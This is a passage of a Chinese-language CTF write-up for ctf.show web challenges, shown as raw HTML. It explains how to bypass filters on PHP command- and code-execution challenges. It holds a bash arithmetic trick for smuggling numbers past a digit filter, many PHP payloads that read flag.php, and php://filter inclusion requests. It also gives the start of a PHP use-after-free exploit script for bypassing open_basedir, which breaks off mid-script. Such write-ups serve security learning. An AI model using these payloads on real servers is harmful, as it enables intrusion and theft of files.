class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat &quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到题目告诉我们flag再36.php文件里面，并且system函数已经包含了cat和php</p>
<p>也就是说只要我们传参一个36就可以 </p>
<p>但是数字被过滤掉了</p>
<p>这时候就要用到一个linux里面的关于$的特性</p>
<p>$(())代表算数运算，举个栗子：a&#x3D;1,b&#x3D;2</p>
<p>$a+$b就等同于$((1+2))</p>
<p>然后因为题目无法传递数字，所以我们还需要用到取反运算</p>
<p>下面我在红帽下面演示一下这个步骤</p>
<p>首先要知道的是当$(())没有参数时。默认为0</p>
<p>所以其实说到这里大家也都直到了，0的取反为-1，然后只要一直这样相加再取反就能得到36（因为题目过滤了乘号，没有过滤加号）</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</span><br><span class="line">$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</span><br><span class="line">$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</span><br><span class="line">$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</span><br><span class="line">$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</span><br><span class="line">$(())))$((~$(())))$((~$(())))))))</span><br><span class="line"># $&#123;_&#125; =&quot;&quot; //返回上一次命令</span><br><span class="line">$(($&#123;_&#125;))=<span class="number">0</span></span><br><span class="line">$((~$(($&#123;_&#125;))))=-<span class="number">1</span></span><br><span class="line">$((~$(())~$(()))) = -<span class="number">1</span>-<span class="number">1</span>=-<span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>也可以用python构造</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data = <span class="string">&quot;$((~$((&quot;</span>+<span class="string">&quot;$((~$(())))&quot;</span>*<span class="number">37</span>+<span class="string">&quot;))))&quot;</span></span><br><span class="line"><span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure>

<h4><span id="web58">web58</span></h4><p>···</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="variable">$filename</span>); <span class="comment">// 非php代码</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="variable">$filename</span>); <span class="comment">// 非php代码</span></span><br><span class="line"><span class="keyword">require</span>(<span class="variable">$filename</span>); <span class="comment">// 非php代码</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="variable">$filename</span>); <span class="comment">// 非php代码</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//一般情况下我们先要获取当前目录，然后读取文件内容</span></span><br><span class="line">c=<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;.&quot;</span>))));　　<span class="comment">// .为当前目录，..为上级目录，scandir(&quot;.&quot;)读出的数组为 .. . flag.php index.php</span></span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;.&quot;</span>))));</span><br><span class="line">c=<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">glob</span>(<span class="string">&quot;*&quot;</span>)));　　<span class="comment">//glob(&quot;*&quot;)读出数组为 flag.php  index.php</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//这里我们知道 /var/www/html/ 目录中只有 index.php 和 flag.php 两个文件，因此直接读取flag.php</span></span><br><span class="line"><span class="comment">//直接读取文件内容</span></span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">c=<span class="title function_ invoke__">show_source</span>(<span class="string">&#x27;falg.php&#x27;</span>);</span><br><span class="line">c=<span class="title function_ invoke__">readfile</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//先读取，再输出，下列需要右击查看源代码</span></span><br><span class="line">c=<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">file</span>(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line">c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line">c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">readfile</span>(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line">c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">php_strip_whitespace</span>(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line">c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">fgets</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;flag.php&#x27;</span>, <span class="string">&quot;r&quot;</span>))); <span class="comment">// 读取一行</span></span><br><span class="line">c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">fgetcsv</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;flag.php&#x27;</span>,<span class="string">&quot;r&quot;</span>), <span class="number">1000</span>));<span class="comment">// 读取一行</span></span><br><span class="line">c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">fscanf</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>, <span class="string">&quot;r&quot;</span>),<span class="string">&quot;%s&quot;</span>));<span class="comment">// 读取一行</span></span><br><span class="line">c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">fgetss</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;flag.php&#x27;</span>, <span class="string">&quot;r&quot;</span>))); <span class="comment">// 从文件指针中读取一行并过滤掉 HTML 标记</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">parse_ini_file</span>(<span class="string">&#x27;flag.php&#x27;</span>)); <span class="comment">// 失败时返回 false , 成功返回配置数组</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//需要先打开文件，再读取内容，最后输出</span></span><br><span class="line">c=<span class="title function_ invoke__">fpassthru</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;flag.php&#x27;</span>,<span class="string">&#x27;r&#x27;</span>));</span><br><span class="line">c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">fread</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;flag.php&#x27;</span>,<span class="string">&#x27;r&#x27;</span>),<span class="number">1000</span>));</span><br><span class="line"> </span><br><span class="line"><span class="comment">//文件包含，后面var_dump(get_defined_vars());可以不写</span></span><br><span class="line">c=<span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">get_defined_vars</span>());</span><br><span class="line">c=<span class="keyword">include_once</span>(<span class="string">&#x27;flag.php&#x27;</span>);<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">get_defined_vars</span>());</span><br><span class="line">c=<span class="keyword">require_once</span>(<span class="string">&#x27;flag.php&#x27;</span>);<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">get_defined_vars</span>());</span><br><span class="line">c=<span class="keyword">require</span>(<span class="string">&#x27;flag.php&#x27;</span>);<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">get_defined_vars</span>());</span><br><span class="line"><span class="comment"># 可以用var_export代替var_dump</span></span><br><span class="line"><span class="title function_ invoke__">var_export</span>(<span class="keyword">require</span>(<span class="string">&#x27;/flag.txt&#x27;</span>));</span><br><span class="line"><span class="comment"># 查看文件</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/&#x27;</span>));</span><br><span class="line"></span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">array_slice</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/&#x27;</span>),<span class="number">6</span>,<span class="number">1</span>)));　　<span class="comment">//这里提供一种思路，当flag被屏蔽时，php不支持通配符，sql支持</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//文件包含传递伪协议</span></span><br><span class="line">POST</span><br><span class="line">c=<span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="number">1</span>];</span><br><span class="line">GET</span><br><span class="line"><span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line"></span><br><span class="line">POST /?<span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php HTTP/1.1</span></span><br><span class="line">Host: eb8e8295-<span class="number">2</span>ab7-<span class="number">4522</span>-<span class="number">9</span>c27-d7d70b69c967.challenge.ctf.show</span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Macintosh; Intel Mac OS X <span class="number">10_15_7</span>) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">103.0</span>.<span class="number">0.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Length: 19</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">c=include $_GET[1];</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>POST请求要加上</p>
<p><code>Content-Type: application/x-www-form-urlencoded</code></p>
</li>
</ul>
<p>或者用蚁剑直连</p>
<h4><span id="web71">web71</span></h4><ul>
<li>在代码执行结束后如果想跳过其余部分，可以使用<code>exit();</code>或者<code>die()</code>方法退出</li>
</ul>
<h4><span id="web72">web72</span></h4><p>尝试读取根目录，但是失败了：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$d</span>=opendir(<span class="string">&quot;/&quot;</span>);<span class="keyword">while</span>(<span class="literal">false</span>!==(<span class="variable">$f</span>=readdir(<span class="variable">$d</span>)))&#123;<span class="built_in">echo</span><span class="string">&quot;<span class="variable">$f</span>\n&quot;</span>;&#125;;<span class="built_in">exit</span>();</span><br></pre></td></tr></table></figure>

<ul>
<li>这题需要用glob协议读取根目录，然后利用uaf脚本命令执行。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="string">&quot;glob:// /*.txt&quot;</span>;                         <span class="comment">//glob:///*.txt应该连起来写，中间空了一下只是方便理解</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$b</span>=<span class="title function_ invoke__">opendir</span>(<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">while</span>((<span class="variable">$file</span>=<span class="title function_ invoke__">readdir</span>(<span class="variable">$b</span>))!==<span class="literal">false</span>)&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;filename:&quot;</span>.<span class="variable">$file</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">closedir</span>(<span class="variable">$b</span>);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>

<p>Payload构造</p>
<p><code>c=$a=&quot;glob:///*.txt&quot;;if($b=opendir($a))&#123;while(($file=readdir($b))!==false)&#123;echo &quot;filename:&quot;.$file.&quot;\n&quot;;&#125;closedir($b);&#125;exit();</code></p>
<p>发现<em>flag0.txt</em>文件</p>
<p>但是由于<code>open_basedir</code>的限制，还是不可以直接include进来，需要想其它的办法。使用UAF。脚本如下：记得要把<code>c=</code>之后的内容url编码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="function"><span class="keyword">function</span> <span class="title">ctfshow</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>();</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$v</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; </span><br><span class="line"></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; </span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span 